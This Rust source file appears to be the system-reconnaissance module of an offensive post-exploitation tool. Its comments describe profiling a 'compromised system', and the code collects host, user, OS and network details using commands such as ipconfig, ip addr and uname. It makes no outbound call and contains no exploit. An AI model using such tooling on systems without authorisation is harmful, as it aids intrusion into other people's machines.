/*
// Author: Aliasgar Khimani (NovusEdge)
// Project: github.com/ARaChn3/remy
//
// Copyright: MIT License
// See the LICENSE file for more info.
*/

//! System information gathering.
//!
//! Collects information about the compromised system including
//! OS details, network configuration, user accounts, and more.
//! Useful for reconnaissance after initial access.

use std::env;
use std::process::Command;

/// Collects comprehensive system information.
///
/// Gathers information using a combination of environment
/// variables and system commands. Results vary by platform.
///
/// # Returns
/// Formatted string with system information sections
pub fn get_system_info() -> Result<String, String> {
    let mut info = String::new();

    // Basic info from environment
    info.push_str("=== SYSTEM INFORMATION ===\n\n");

    // Hostname
    info.push_str(&format!(
        "Hostname: {}\n",
        hostname::get()
            .map(|h| h.to_string_lossy().to_string())
            .unwrap_or_else(|_| "Unknown".to_string())
    ));

    // OS
    info.push_str(&format!("OS: {} {}\n", env::consts::OS, env::consts::ARCH));

    // Current user
    info.push_str(&format!(
        "User: {}\n",
        env::var("USER")
            .or_else(|_| env::var("USERNAME"))
            .unwrap_or_else(|_| "Unknown".to_string())
    ));

    // Home directory
    info.push_str(&format!(
        "Home: {}\n",
        env::var("HOME")
            .or_else(|_| env::var("USERPROFILE"))
            .unwrap_or_else(|_| "Unknown".to_string())
    ));

    // Current directory
    info.push_str(&format!(
        "CWD: {}\n",
        env::current_dir()
            .map(|p| p.display().to_string())
            .unwrap_or_else(|_| "Unknown".to_string())
    ));

    // Network info
    info.push_str("\n=== NETWORK ===\n\n");
    info.push_str(&get_network_info());

    // Process info
    info.push_str("\n=== PROCESS ===\n\n");
    info.push_str(&format!("PID: {}\n", std::process::id()));

    // Additional platform-specific info
    info.push_str("\n=== PLATFORM SPECIFIC ===\n\n");
    info.push_str(&get_platform_info());

    Ok(info)
}

/// Gets network configuration information.
///
/// Uses platform-appropriate commands to gather IP addresses,
/// interfaces, and routing information.
fn get_network_info() -> String {
    let output = if cfg!(target_os = "windows") {
        Command::new("ipconfig").output()
    } else {
        // Try ip first (modern Linux), fall back to ifconfig
        Command::new("ip")
            .args(["addr", "show"])
            .output()
            .or_else(|_| Command::new("ifconfig").output())
    };

    match output {
        Ok(out) => String::from_utf8_lossy(&out.stdout).to_string(),
        Err(_) => "Failed to get network info\n".to_string(),
    }
}

/// Gets platform-specific additional information.
///
/// - Windows: systeminfo summary
/// - Linux: uname, /etc/os-release
/// - macOS: system_profiler summary
fn get_platform_info() -> String {
    let mut info = String::new();

    if cfg!(target_os = "windows") {
        // Windows - get abbreviated systeminfo
        if let Ok(output) = Command::new("systeminfo").output() {
            let full = String::from_utf8_lossy(&output.stdout);
            // Just get the first 30 lines to avoid huge output
            for line in full.lines().take(30) {
                info.push_str(line);
                info.push('\n');
            }
        }
    } else if cfg!(target_os = "linux") {
        // Linux - uname and os-release
        if let Ok(output) = Command::new("uname").args(["-a"]).output() {
            info.push_str(&format!(
                "Kernel: {}\n",
                String::from_utf8_lossy(&output.stdout).trim()
            ));
        }

        // Try to read /etc/os-release
        if let Ok(content) = std::fs::read_to_string("/etc/os-release") {
            info.push_str("\nDistro Info:\n");
            for line in content.lines().take(5) {
                info.push_str(line);
                info.push('\n');
            }
        }
    } else if cfg!(target_os = "macos") {
        // macOS - sw_vers
        if let Ok(output) = Command::new("sw_vers").output() {
            info.push_str(&String::from_utf8_lossy(&output.stdout));
        }
    }

    info
}
